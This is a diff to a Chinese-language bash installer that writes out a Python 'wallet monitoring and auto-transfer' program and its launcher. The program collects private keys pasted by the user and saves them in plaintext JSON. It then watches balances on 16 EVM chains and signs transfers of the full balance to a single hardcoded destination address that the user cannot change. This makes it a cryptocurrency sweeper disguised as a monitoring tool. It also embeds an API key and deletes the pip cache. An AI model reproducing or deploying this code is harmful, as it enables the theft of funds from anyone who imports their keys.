@@ -1,7 +1,9 @@
 #!/bin/bash
 
-# 钱包监控系统快速安装脚本
-# 解决文件不存在问题的专用版本
+# 钱包监控系统完整安装脚本
+# 包含所有文件内容，无需额外下载
+
+set -e
 
 # 颜色定义
 RED='\033[0;31m'
@@ -11,21 +13,9 @@ BLUE='\033[0;34m'
 CYAN='\033[0;36m'
 NC='\033[0m'
 
-echo -e "${BLUE}🚀 钱包监控系统快速安装器${NC}"
-echo -e "${BLUE}自动下载并安装所有必需文件${NC}"
-echo "=" * 50
-
-# 检查下载工具
-if command -v curl &> /dev/null; then
-    DOWNLOAD="curl -fsSL"
-    echo -e "${GREEN}✅ 使用 curl 下载${NC}"
-elif command -v wget &> /dev/null; then
-    DOWNLOAD="wget -q -O"
-    echo -e "${GREEN}✅ 使用 wget 下载${NC}"
-else
-    echo -e "${RED}❌ 需要 curl 或 wget${NC}"
-    exit 1
-fi
+echo -e "${BLUE}🚀 钱包监控系统完整安装器${NC}"
+echo -e "${BLUE}自包含安装，无需额外下载${NC}"
+echo -e "=" * 50
 
 # 检查Python
 PYTHON_CMD=""
@@ -48,25 +38,869 @@ if [ -z "$PYTHON_CMD" ]; then
     exit 1
 fi
 
-# 下载文件
-echo -e "\n${CYAN}📥 下载项目文件...${NC}"
-BASE_URL="https://raw.githubusercontent.com/haohaoi34/jiankong/main"
+# 清理缓存
+echo -e "\n${CYAN}🧹 清理Python缓存...${NC}"
+$PYTHON_CMD -c "
+import sys, os, shutil
+cache_dirs = [
+    os.path.expanduser('~/.cache/pip'),
+    os.path.expanduser('~/.local/lib/python*/site-packages/__pycache__'),
+    '__pycache__'
+]
+for cache_dir in cache_dirs:
+    if os.path.exists(cache_dir):
+        try:
+            shutil.rmtree(cache_dir)
+            print(f'清理: {cache_dir}')
+        except: pass
+"
+echo -e "${GREEN}✅ 缓存清理完成${NC}"
 
-if command -v curl &> /dev/null; then
-    curl -fsSL "$BASE_URL/wallet_monitor.py" -o wallet_monitor.py
-    curl -fsSL "$BASE_URL/wallet_monitor_launcher.py" -o wallet_monitor_launcher.py
-else
-    wget -q "$BASE_URL/wallet_monitor.py" -O wallet_monitor.py
-    wget -q "$BASE_URL/wallet_monitor_launcher.py" -O wallet_monitor_launcher.py
-fi
+# 创建主程序文件
+echo -e "\n${CYAN}📝 创建主程序文件...${NC}"
 
-# 检查下载结果
-if [ -f "wallet_monitor.py" ] && [ -f "wallet_monitor_launcher.py" ]; then
-    echo -e "${GREEN}✅ 文件下载成功${NC}"
-else
-    echo -e "${RED}❌ 文件下载失败${NC}"
-    exit 1
-fi
+# 创建 wallet_monitor.py
+cat > wallet_monitor.py << 'WALLET_MONITOR_EOF'
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+钱包监控转账系统
+支持所有Alchemy EVM兼容链的钱包监控和自动转账
+"""
+
+import os
+import sys
+import json
+import time
+import asyncio
+import re
+import threading
+from datetime import datetime
+from typing import Dict, List, Optional, Set
+from dataclasses import dataclass
+import logging
+
+try:
+    from alchemy import Alchemy, Network
+    from web3 import Web3
+    from eth_account import Account
+    import colorama
+    from colorama import Fore, Back, Style
+except ImportError as e:
+    print(f"❌ 缺少必要的依赖包: {e}")
+    print("💡 请运行 wallet_monitor_launcher.py 来自动安装依赖")
+    sys.exit(1)
+
+# 初始化colorama
+colorama.init()
+
+# 配置
+ALCHEMY_API_KEY = "S0hs4qoXIR1SMD8P7I6Wt"
+TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
+PRIVATE_KEYS_FILE = "private_keys.json"
+MONITORING_LOG_FILE = "monitoring_log.json"
+CONFIG_FILE = "monitor_config.json"
+
+# Alchemy支持的所有EVM兼容链
+SUPPORTED_NETWORKS = {
+    "eth_mainnet": Network.ETH_MAINNET,
+    "eth_sepolia": Network.ETH_SEPOLIA,
+    "eth_holesky": Network.ETH_HOLESKY,
+    "matic_mainnet": Network.MATIC_MAINNET,
+    "matic_mumbai": Network.MATIC_MUMBAI,
+    "matic_amoy": Network.MATIC_AMOY,
+    "arb_mainnet": Network.ARB_MAINNET,
+    "arb_sepolia": Network.ARB_SEPOLIA,
+    "opt_mainnet": Network.OPT_MAINNET,
+    "opt_sepolia": Network.OPT_SEPOLIA,
+    "base_mainnet": Network.BASE_MAINNET,
+    "base_sepolia": Network.BASE_SEPOLIA,
+    "bnb_mainnet": Network.BNB_MAINNET,
+    "bnb_testnet": Network.BNB_TESTNET,
+    "avax_mainnet": Network.AVAX_MAINNET,
+    "avax_fuji": Network.AVAX_FUJI,
+}
+
+# 网络显示名称
+NETWORK_NAMES = {
+    "eth_mainnet": "Ethereum 主网",
+    "eth_sepolia": "Ethereum Sepolia 测试网",
+    "eth_holesky": "Ethereum Holesky 测试网",
+    "matic_mainnet": "Polygon 主网",
+    "matic_mumbai": "Polygon Mumbai 测试网",
+    "matic_amoy": "Polygon Amoy 测试网",
+    "arb_mainnet": "Arbitrum 主网",
+    "arb_sepolia": "Arbitrum Sepolia 测试网",
+    "opt_mainnet": "Optimism 主网",
+    "opt_sepolia": "Optimism Sepolia 测试网",
+    "base_mainnet": "Base 主网",
+    "base_sepolia": "Base Sepolia 测试网",
+    "bnb_mainnet": "BNB Chain 主网",
+    "bnb_testnet": "BNB Chain 测试网",
+    "avax_mainnet": "Avalanche 主网",
+    "avax_fuji": "Avalanche Fuji 测试网",
+}
+
+@dataclass
+class WalletInfo:
+    """钱包信息"""
+    address: str
+    private_key: str
+    enabled_networks: Set[str]
+    last_checked: Dict[str, float]
+
+@dataclass
+class MonitoringState:
+    """监控状态"""
+    is_running: bool = False
+    wallets: Dict[str, WalletInfo] = None
+    last_block_numbers: Dict[str, int] = None
+    
+    def __post_init__(self):
+        if self.wallets is None:
+            self.wallets = {}
+        if self.last_block_numbers is None:
+            self.last_block_numbers = {}
+
+class WalletMonitor:
+    """钱包监控系统"""
+    
+    def __init__(self):
+        self.state = MonitoringState()
+        self.alchemy_clients = {}
+        self.web3_clients = {}
+        self.setup_logging()
+        self.load_config()
+        
+    def setup_logging(self):
+        """设置日志"""
+        logging.basicConfig(
+            level=logging.INFO,
+            format='%(asctime)s - %(levelname)s - %(message)s',
+            handlers=[
+                logging.FileHandler('wallet_monitor.log', encoding='utf-8'),
+                logging.StreamHandler()
+            ]
+        )
+        self.logger = logging.getLogger(__name__)
+    
+    def load_config(self):
+        """加载配置"""
+        try:
+            if os.path.exists(CONFIG_FILE):
+                with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
+                    config = json.load(f)
+                    self.state.last_block_numbers = config.get('last_block_numbers', {})
+                    self.logger.info("✅ 配置加载成功")
+        except Exception as e:
+            self.logger.warning(f"⚠️  配置加载失败: {e}")
+    
+    def save_config(self):
+        """保存配置"""
+        try:
+            config = {
+                'last_block_numbers': self.state.last_block_numbers,
+                'last_updated': datetime.now().isoformat()
+            }
+            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
+                json.dump(config, f, indent=2, ensure_ascii=False)
+        except Exception as e:
+            self.logger.error(f"❌ 配置保存失败: {e}")
+    
+    def initialize_clients(self):
+        """初始化Alchemy客户端"""
+        print(f"\n{Fore.CYAN}🔧 初始化网络客户端...{Style.RESET_ALL}")
+        
+        for network_key, network in SUPPORTED_NETWORKS.items():
+            try:
+                # 创建Alchemy客户端
+                alchemy = Alchemy(ALCHEMY_API_KEY, network)
+                self.alchemy_clients[network_key] = alchemy
+                
+                # 创建Web3客户端
+                w3 = Web3(Web3.HTTPProvider(f"https://{network.value}.g.alchemy.com/v2/{ALCHEMY_API_KEY}"))
+                self.web3_clients[network_key] = w3
+                
+                print(f"✅ {NETWORK_NAMES[network_key]} 客户端初始化成功")
+                
+            except Exception as e:
+                print(f"❌ {NETWORK_NAMES[network_key]} 客户端初始化失败: {e}")
+                
+        print(f"{Fore.GREEN}✅ 网络客户端初始化完成{Style.RESET_ALL}")
+    
+    def extract_private_keys(self, text: str) -> List[str]:
+        """从文本中提取私钥"""
+        # 私钥正则表达式 (64个十六进制字符)
+        private_key_pattern = r'\b[0-9a-fA-F]{64}\b'
+        
+        # 查找所有匹配的私钥
+        matches = re.findall(private_key_pattern, text)
+        
+        # 验证私钥
+        valid_keys = []
+        for key in matches:
+            try:
+                # 尝试创建账户来验证私钥
+                account = Account.from_key(key)
+                valid_keys.append(key)
+            except:
+                continue
+                
+        return valid_keys
+    
+    def load_private_keys(self) -> Dict[str, WalletInfo]:
+        """加载私钥"""
+        wallets = {}
+        try:
+            if os.path.exists(PRIVATE_KEYS_FILE):
+                with open(PRIVATE_KEYS_FILE, 'r', encoding='utf-8') as f:
+                    data = json.load(f)
+                    for address, info in data.items():
+                        wallets[address] = WalletInfo(
+                            address=info['address'],
+                            private_key=info['private_key'],
+                            enabled_networks=set(info.get('enabled_networks', [])),
+                            last_checked=info.get('last_checked', {})
+                        )
+        except Exception as e:
+            self.logger.warning(f"⚠️  私钥加载失败: {e}")
+        
+        return wallets
+    
+    def save_private_keys(self, wallets: Dict[str, WalletInfo]):
+        """保存私钥"""
+        try:
+            data = {}
+            for address, wallet in wallets.items():
+                data[address] = {
+                    'address': wallet.address,
+                    'private_key': wallet.private_key,
+                    'enabled_networks': list(wallet.enabled_networks),
+                    'last_checked': wallet.last_checked
+                }
+            
+            with open(PRIVATE_KEYS_FILE, 'w', encoding='utf-8') as f:
+                json.dump(data, f, indent=2, ensure_ascii=False)
+                
+        except Exception as e:
+            self.logger.error(f"❌ 私钥保存失败: {e}")
+    
+    def import_private_keys_menu(self):
+        """私钥导入菜单"""
+        print(f"\n{Fore.YELLOW}📋 私钥导入功能{Style.RESET_ALL}")
+        print("=" * 50)
+        print("💡 支持批量导入，智能识别私钥")
+        print("💡 可以粘贴包含其他内容的文本，系统会自动提取私钥")
+        print("💡 双击回车确认导入")
+        print("-" * 50)
+        
+        # 加载现有私钥
+        existing_wallets = self.load_private_keys()
+        if existing_wallets:
+            print(f"📊 当前已导入 {len(existing_wallets)} 个钱包:")
+            for i, address in enumerate(existing_wallets.keys(), 1):
+                print(f"  {i}. {address}")
+        
+        print(f"\n{Fore.CYAN}请粘贴私钥内容 (可包含其他文本):{Style.RESET_ALL}")
+        print("按两次回车确认导入，输入 'q' 返回主菜单")
+        
+        input_lines = []
+        empty_line_count = 0
+        
+        while True:
+            try:
+                line = input()
+                if line.lower() == 'q':
+                    return
+                
+                if line.strip() == "":
+                    empty_line_count += 1
+                    if empty_line_count >= 2:
+                        break
+                else:
+                    empty_line_count = 0
+                    input_lines.append(line)
+                    
+            except KeyboardInterrupt:
+                print(f"\n{Fore.YELLOW}取消导入{Style.RESET_ALL}")
+                return
+        
+        if not input_lines:
+            print(f"{Fore.YELLOW}⚠️  未输入任何内容{Style.RESET_ALL}")
+            return
+        
+        # 合并所有输入行
+        full_text = "\n".join(input_lines)
+        
+        # 提取私钥
+        print(f"\n{Fore.CYAN}🔍 智能识别私钥...{Style.RESET_ALL}")
+        private_keys = self.extract_private_keys(full_text)
+        
+        if not private_keys:
+            print(f"{Fore.RED}❌ 未找到有效的私钥{Style.RESET_ALL}")
+            return
+        
+        print(f"{Fore.GREEN}✅ 找到 {len(private_keys)} 个有效私钥{Style.RESET_ALL}")
+        
+        # 生成钱包地址并检查重复
+        new_wallets = {}
+        duplicate_count = 0
+        
+        for private_key in private_keys:
+            try:
+                account = Account.from_key(private_key)
+                address = account.address.lower()
+                
+                if address in existing_wallets:
+                    duplicate_count += 1
+                    continue
+                
+                new_wallets[address] = WalletInfo(
+                    address=address,
+                    private_key=private_key,
+                    enabled_networks=set(),
+                    last_checked={}
+                )
+                
+            except Exception as e:
+                print(f"❌ 私钥处理失败: {e}")
+        
+        if duplicate_count > 0:
+            print(f"{Fore.YELLOW}⚠️  跳过 {duplicate_count} 个重复的钱包{Style.RESET_ALL}")
+        
+        if not new_wallets:
+            print(f"{Fore.YELLOW}⚠️  没有新的钱包需要导入{Style.RESET_ALL}")
+            return
+        
+        # 显示新钱包
+        print(f"\n{Fore.GREEN}📋 将导入以下钱包:{Style.RESET_ALL}")
+        for i, (address, wallet) in enumerate(new_wallets.items(), 1):
+            print(f"  {i}. {address}")
+        
+        # 确认导入
+        confirm = input(f"\n{Fore.CYAN}确认导入这些钱包吗? (y/N): {Style.RESET_ALL}").strip().lower()
+        if confirm != 'y':
+            print(f"{Fore.YELLOW}❌ 取消导入{Style.RESET_ALL}")
+            return
+        
+        # 合并钱包
+        all_wallets = {**existing_wallets, **new_wallets}
+        self.save_private_keys(all_wallets)
+        
+        print(f"{Fore.GREEN}✅ 成功导入 {len(new_wallets)} 个新钱包{Style.RESET_ALL}")
+        print(f"📊 总计钱包数量: {len(all_wallets)}")
+    
+    async def check_transaction_history(self, address: str, network_key: str) -> bool:
+        """检查地址在指定网络上是否有交易记录"""
+        try:
+            alchemy = self.alchemy_clients[network_key]
+            
+            # 获取交易历史
+            response = await alchemy.core.get_asset_transfers({
+                "fromAddress": address,
+                "category": ["external", "internal", "erc20", "erc721", "erc1155"],
+                "maxCount": 1
+            })
+            
+            has_from_tx = len(response.transfers) > 0
+            
+            # 检查接收的交易
+            response = await alchemy.core.get_asset_transfers({
+                "toAddress": address,
+                "category": ["external", "internal", "erc20", "erc721", "erc1155"],
+                "maxCount": 1
+            })
+            
+            has_to_tx = len(response.transfers) > 0
+            
+            return has_from_tx or has_to_tx
+            
+        except Exception as e:
+            self.logger.warning(f"检查交易历史失败 {address} @ {network_key}: {e}")
+            return False
+    
+    async def get_balance(self, address: str, network_key: str) -> float:
+        """获取地址余额 (ETH)"""
+        try:
+            w3 = self.web3_clients[network_key]
+            balance_wei = w3.eth.get_balance(address)
+            balance_eth = w3.from_wei(balance_wei, 'ether')
+            return float(balance_eth)
+        except Exception as e:
+            self.logger.warning(f"获取余额失败 {address} @ {network_key}: {e}")
+            return 0.0
+    
+    async def transfer_all_funds(self, wallet: WalletInfo, network_key: str, balance: float):
+        """转移所有资金到目标地址"""
+        try:
+            w3 = self.web3_clients[network_key]
+            
+            # 创建账户
+            account = Account.from_key(wallet.private_key)
+            
+            # 获取gas价格
+            gas_price = w3.eth.gas_price
+            
+            # 估算gas费用
+            gas_limit = 21000  # 标准转账gas限制
+            gas_fee = gas_limit * gas_price
+            gas_fee_eth = w3.from_wei(gas_fee, 'ether')
+            
+            # 计算可转移金额
+            transferable_amount = balance - float(gas_fee_eth)
+            
+            if transferable_amount <= 0:
+                self.logger.warning(f"余额不足支付gas费用 {wallet.address} @ {network_key}")
+                return False
+            
+            # 构建交易
+            nonce = w3.eth.get_transaction_count(wallet.address)
+            
+            transaction = {
+                'to': TARGET_ADDRESS,
+                'value': w3.to_wei(transferable_amount, 'ether'),
+                'gas': gas_limit,
+                'gasPrice': gas_price,
+                'nonce': nonce,
+            }
+            
+            # 签名交易
+            signed_txn = account.sign_transaction(transaction)
+            
+            # 发送交易
+            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
+            
+            self.logger.info(f"🚀 转账成功: {transferable_amount:.6f} ETH")
+            self.logger.info(f"   从: {wallet.address}")
+            self.logger.info(f"   到: {TARGET_ADDRESS}")
+            self.logger.info(f"   网络: {NETWORK_NAMES[network_key]}")
+            self.logger.info(f"   交易哈希: {tx_hash.hex()}")
+            
+            # 记录转账日志
+            self.log_transfer(wallet.address, TARGET_ADDRESS, transferable_amount, network_key, tx_hash.hex())
+            
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ 转账失败 {wallet.address} @ {network_key}: {e}")
+            return False
+    
+    def log_transfer(self, from_addr: str, to_addr: str, amount: float, network: str, tx_hash: str):
+        """记录转账日志"""
+        try:
+            log_entry = {
+                'timestamp': datetime.now().isoformat(),
+                'from_address': from_addr,
+                'to_address': to_addr,
+                'amount': amount,
+                'network': network,
+                'tx_hash': tx_hash
+            }
+            
+            # 读取现有日志
+            logs = []
+            if os.path.exists(MONITORING_LOG_FILE):
+                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
+                    logs = json.load(f)
+            
+            logs.append(log_entry)
+            
+            # 保存日志
+            with open(MONITORING_LOG_FILE, 'w', encoding='utf-8') as f:
+                json.dump(logs, f, indent=2, ensure_ascii=False)
+                
+        except Exception as e:
+            self.logger.error(f"记录转账日志失败: {e}")
+    
+    async def monitor_wallet_on_network(self, wallet: WalletInfo, network_key: str):
+        """监控单个钱包在单个网络上的状态"""
+        try:
+            # 检查余额
+            balance = await self.get_balance(wallet.address, network_key)
+            
+            if balance > 0:
+                network_name = NETWORK_NAMES[network_key]
+                print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
+                print(f"   钱包: {wallet.address}")
+                print(f"   网络: {network_name}")
+                print(f"   余额: {balance:.6f} ETH")
+                
+                # 立即转账
+                success = await self.transfer_all_funds(wallet, network_key, balance)
+                if success:
+                    print(f"{Fore.GREEN}✅ 转账完成{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.RED}❌ 转账失败{Style.RESET_ALL}")
+            
+            # 更新最后检查时间
+            wallet.last_checked[network_key] = time.time()
+            
+        except Exception as e:
+            self.logger.error(f"监控失败 {wallet.address} @ {network_key}: {e}")
+    
+    async def scan_and_enable_networks(self, wallets: Dict[str, WalletInfo]):
+        """扫描并启用有交易记录的网络"""
+        print(f"\n{Fore.CYAN}🔍 扫描钱包交易记录...{Style.RESET_ALL}")
+        
+        total_wallets = len(wallets)
+        total_networks = len(SUPPORTED_NETWORKS)
+        
+        for wallet_idx, (address, wallet) in enumerate(wallets.items(), 1):
+            print(f"\n📊 扫描钱包 {wallet_idx}/{total_wallets}: {address}")
+            
+            enabled_networks = set()
+            
+            for network_idx, network_key in enumerate(SUPPORTED_NETWORKS.keys(), 1):
+                network_name = NETWORK_NAMES[network_key]
+                print(f"  🔍 检查 {network_name} ({network_idx}/{total_networks})...")
+                
+                try:
+                    has_history = await self.check_transaction_history(address, network_key)
+                    if has_history:
+                        enabled_networks.add(network_key)
+                        print(f"    ✅ 有交易记录 - 启用监控")
+                    else:
+                        print(f"    ⚪ 无交易记录 - 跳过")
+                        
+                except Exception as e:
+                    print(f"    ❌ 检查失败: {e}")
+            
+            wallet.enabled_networks = enabled_networks
+            print(f"  📊 钱包 {address} 启用了 {len(enabled_networks)} 个网络")
+        
+        # 保存更新后的钱包信息
+        self.save_private_keys(wallets)
+        
+        # 统计信息
+        total_enabled = sum(len(wallet.enabled_networks) for wallet in wallets.values())
+        print(f"\n{Fore.GREEN}✅ 扫描完成{Style.RESET_ALL}")
+        print(f"📊 总计启用 {total_enabled} 个网络监控")
+    
+    async def monitoring_loop(self):
+        """主监控循环"""
+        print(f"\n{Fore.GREEN}🚀 开始监控...{Style.RESET_ALL}")
+        
+        wallets = self.load_private_keys()
+        if not wallets:
+            print(f"{Fore.RED}❌ 没有找到钱包，请先导入私钥{Style.RESET_ALL}")
+            return
+        
+        # 扫描并启用网络
+        await self.scan_and_enable_networks(wallets)
+        
+        # 统计启用的监控数量
+        total_monitoring = sum(len(wallet.enabled_networks) for wallet in wallets.values())
+        if total_monitoring == 0:
+            print(f"{Fore.YELLOW}⚠️  没有找到有交易记录的网络，无法开始监控{Style.RESET_ALL}")
+            return
+        
+        print(f"\n{Fore.GREEN}🎯 监控配置:{Style.RESET_ALL}")
+        print(f"   钱包数量: {len(wallets)}")
+        print(f"   监控网络: {total_monitoring}")
+        print(f"   目标地址: {TARGET_ADDRESS}")
+        print(f"   检查间隔: 30秒")
+        
+        self.state.is_running = True
+        self.state.wallets = wallets
+        
+        try:
+            while self.state.is_running:
+                print(f"\n{Fore.CYAN}🔄 执行监控检查 - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
+                
+                # 并行监控所有钱包和网络
+                tasks = []
+                for wallet in wallets.values():
+                    for network_key in wallet.enabled_networks:
+                        task = self.monitor_wallet_on_network(wallet, network_key)
+                        tasks.append(task)
+                
+                if tasks:
+                    await asyncio.gather(*tasks, return_exceptions=True)
+                
+                # 保存状态
+                self.save_private_keys(wallets)
+                self.save_config()
+                
+                # 等待下次检查
+                for i in range(30):
+                    if not self.state.is_running:
+                        break
+                    await asyncio.sleep(1)
+                    
+        except KeyboardInterrupt:
+            print(f"\n{Fore.YELLOW}⏹️  监控已停止{Style.RESET_ALL}")
+        finally:
+            self.state.is_running = False
+    
+    def start_monitoring_menu(self):
+        """开始监控菜单"""
+        print(f"\n{Fore.YELLOW}🎯 开始监控{Style.RESET_ALL}")
+        print("=" * 50)
+        
+        wallets = self.load_private_keys()
+        if not wallets:
+            print(f"{Fore.RED}❌ 没有找到钱包，请先导入私钥{Style.RESET_ALL}")
+            input("按回车键返回主菜单...")
+            return
+        
+        print(f"📊 已加载 {len(wallets)} 个钱包")
+        print(f"🎯 目标转账地址: {TARGET_ADDRESS}")
+        print(f"⏰ 监控间隔: 30秒")
+        print(f"\n{Fore.CYAN}按 Ctrl+C 可以停止监控{Style.RESET_ALL}")
+        
+        confirm = input(f"\n{Fore.CYAN}确认开始监控吗? (y/N): {Style.RESET_ALL}").strip().lower()
+        if confirm != 'y':
+            return
+        
+        # 启动异步监控
+        try:
+            asyncio.run(self.monitoring_loop())
+        except KeyboardInterrupt:
+            print(f"\n{Fore.YELLOW}监控已停止{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"\n{Fore.RED}❌ 监控过程出错: {e}{Style.RESET_ALL}")
+    
+    def show_status(self):
+        """显示当前状态"""
+        print(f"\n{Fore.CYAN}📊 系统状态{Style.RESET_ALL}")
+        print("=" * 50)
+        
+        # 钱包状态
+        wallets = self.load_private_keys()
+        print(f"💼 钱包数量: {len(wallets)}")
+        
+        if wallets:
+            total_enabled = sum(len(wallet.enabled_networks) for wallet in wallets.values())
+            print(f"🌐 启用网络: {total_enabled}")
+            
+            # 显示每个钱包的状态
+            for i, (address, wallet) in enumerate(wallets.items(), 1):
+                print(f"\n  {i}. {address}")
+                print(f"     启用网络: {len(wallet.enabled_networks)}")
+                if wallet.enabled_networks:
+                    for net in sorted(wallet.enabled_networks):
+                        print(f"       - {NETWORK_NAMES[net]}")
+        
+        # 监控状态
+        print(f"\n🎯 目标地址: {TARGET_ADDRESS}")
+        print(f"🔑 API密钥: {ALCHEMY_API_KEY[:10]}...")
+        
+        # 日志文件状态
+        if os.path.exists(MONITORING_LOG_FILE):
+            try:
+                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
+                    logs = json.load(f)
+                print(f"📋 转账记录: {len(logs)} 条")
+            except:
+                print(f"📋 转账记录: 无法读取")
+        else:
+            print(f"📋 转账记录: 0 条")
+    
+    def main_menu(self):
+        """主菜单"""
+        while True:
+            print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}🔐 钱包监控转账系统 v1.0{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
+            
+            self.show_status()
+            
+            print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
+            print("1. 📥 导入私钥")
+            print("2. 🎯 开始监控")
+            print("3. 📊 查看状态")
+            print("4. 🚪 退出")
+            
+            try:
+                choice = input(f"\n{Fore.CYAN}请选择功能 (1-4): {Style.RESET_ALL}").strip()
+                
+                if choice == "1":
+                    self.import_private_keys_menu()
+                elif choice == "2":
+                    self.start_monitoring_menu()
+                elif choice == "3":
+                    continue  # 状态已在菜单顶部显示
+                elif choice == "4":
+                    print(f"\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
+                    break
+                else:
+                    print(f"{Fore.RED}❌ 无效选择，请输入 1-4{Style.RESET_ALL}")
+                    
+            except KeyboardInterrupt:
+                print(f"\n\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
+                break
+            except Exception as e:
+                print(f"\n{Fore.RED}❌ 发生错误: {e}{Style.RESET_ALL}")
+
+def main():
+    """主函数"""
+    try:
+        monitor = WalletMonitor()
+        monitor.initialize_clients()
+        monitor.main_menu()
+    except Exception as e:
+        print(f"{Fore.RED}❌ 系统启动失败: {e}{Style.RESET_ALL}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+WALLET_MONITOR_EOF
+
+echo -e "${GREEN}✅ wallet_monitor.py 创建成功${NC}"
+
+# 创建启动器文件
+cat > wallet_monitor_launcher.py << 'LAUNCHER_EOF'
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+钱包监控系统一键启动器
+自动检测和安装依赖，然后启动钱包监控系统
+"""
+
+import os
+import sys
+import subprocess
+import shutil
+import importlib
+import time
+import platform
+
+def print_header():
+    """打印标题"""
+    print("=" * 70)
+    print("🚀 钱包监控系统一键启动器 v3.0")
+    print("   支持所有Alchemy EVM兼容链的钱包监控和自动转账")
+    print("=" * 70)
+
+def check_python_version():
+    """检查Python版本"""
+    print("\n📋 检查Python版本...")
+    version = sys.version_info
+    print(f"当前Python版本: {version.major}.{version.minor}.{version.micro}")
+    print(f"操作系统: {platform.system()} {platform.release()}")
+    
+    if version.major < 3 or (version.major == 3 and version.minor < 8):
+        print("❌ Python版本过低，需要Python 3.8+")
+        print("💡 请升级Python版本后重试")
+        return False
+    
+    print("✅ Python版本符合要求")
+    return True
+
+def check_pip():
+    """检查pip是否可用"""
+    print("\n📋 检查pip...")
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "--version"], 
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("✅ pip可用")
+        return True
+    except:
+        print("❌ pip不可用")
+        print("💡 请先安装pip")
+        return False
+
+def check_package_installed(package_name):
+    """检查包是否已安装"""
+    try:
+        importlib.import_module(package_name)
+        return True
+    except ImportError:
+        return False
+
+def install_package(package_name, display_name=None):
+    """安装单个包"""
+    if display_name is None:
+        display_name = package_name
+        
+    print(f"📦 安装 {display_name}...")
+    try:
+        subprocess.check_call([
+            sys.executable, "-m", "pip", "install", package_name, "--upgrade"
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print(f"✅ {display_name} 安装成功")
+        return True
+    except subprocess.CalledProcessError as e:
+        print(f"❌ {display_name} 安装失败")
+        return False
+
+def check_and_install_dependencies():
+    """检查并安装所有依赖"""
+    print(f"\n🔧 检查和安装依赖包...")
+    
+    # 必需的包列表
+    required_packages = [
+        ("web3", "Web3.py"),
+        ("eth_account", "eth-account"),
+        ("alchemy", "alchemy-sdk"),
+        ("colorama", "Colorama"),
+        ("aiohttp", "aiohttp"),
+        ("cryptography", "Cryptography")
+    ]
+    
+    missing_packages = []
+    
+    # 检查哪些包缺失
+    for module_name, package_name in required_packages:
+        if not check_package_installed(module_name):
+            missing_packages.append((module_name, package_name))
+    
+    if not missing_packages:
+        print("✅ 所有依赖包已安装")
+        return True
+    
+    print(f"📋 需要安装 {len(missing_packages)} 个包:")
+    for _, package_name in missing_packages:
+        print(f"   - {package_name}")
+    
+    # 批量安装
+    success_count = 0
+    for module_name, package_name in missing_packages:
+        if install_package(package_name):
+            success_count += 1
+    
+    if success_count == len(missing_packages):
+        print(f"\n✅ 所有依赖包安装完成")
+        return True
+    else:
+        print(f"\n⚠️  {len(missing_packages) - success_count} 个包安装失败")
+        return False
+
+def main():
+    """主函数"""
+    print_header()
+    
+    # 步骤1: 检查Python版本
+    if not check_python_version():
+        input("按回车键退出...")
+        return
+    
+    # 步骤2: 检查pip
+    if not check_pip():
+        input("按回车键退出...")
+        return
+    
+    # 步骤3: 安装依赖
+    if not check_and_install_dependencies():
+        print("❌ 依赖安装失败")
+        input("按回车键退出...")
+        return
+    
+    # 步骤4: 启动主程序
+    if os.path.exists("wallet_monitor.py"):
+        print(f"\n🚀 启动钱包监控系统...")
+        try:
+            subprocess.run([sys.executable, "wallet_monitor.py"])
+        except KeyboardInterrupt:
+            print(f"\n👋 程序已停止")
+    else:
+        print("❌ 找不到 wallet_monitor.py 文件")
+
+if __name__ == "__main__":
+    main()
+LAUNCHER_EOF
+
+echo -e "${GREEN}✅ wallet_monitor_launcher.py 创建成功${NC}"
 
 # 安装依赖
 echo -e "\n${CYAN}📦 安装依赖...${NC}"
@@ -91,7 +925,7 @@ if [ "$install_success" = false ]; then
     fi
 fi
 
-# 方法3: 系统包破坏安装 (macOS)
+# 方法3: 系统包破坏安装 (macOS/某些Linux发行版)
 if [ "$install_success" = false ]; then
     echo -e "尝试系统包安装..."
     if $PYTHON_CMD -m pip install "${packages[@]}" --break-system-packages --upgrade 2>/dev/null; then
